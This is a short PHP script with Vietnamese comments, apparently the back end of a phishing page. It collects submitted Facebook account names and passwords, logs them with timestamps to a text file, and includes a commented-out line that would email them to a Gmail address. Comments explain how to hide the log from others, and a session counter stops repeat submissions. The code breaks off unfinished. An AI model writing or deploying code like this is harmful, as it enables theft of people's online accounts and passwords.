<?php 
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
 $huongdz['num'] = 0;
	if(isset($_SESSION['huongdz'])) {
		$huongdz = $_SESSION['huongdz'];
	}
	if($huongdz['num'] == 4){ //đăt số lần đăng nhập cho phép
	    die('<script>alert("Spam cc cút")</script>') ; //thông báo sau khi đăng nhập quá số lần cho phép
	}
if(isset($_POST["acc"])){
//   $type=='';
 $time = date('H:i:s d/m/Y');
    $acc = $_POST["acc"];
    $pass = $_POST["pass"];
    $type = $_POST["type"];
     $subject = "Cảm ơn bạn đã sử dụng code!";
     $headers = "Tài khoản facebook";
      $body = "\nTime: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n____________________________________________________________\n";//định dạng acc|pass
    
     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
    	$huongdz['num']++;
$_SESSION['huongdz'] = $huongdz;
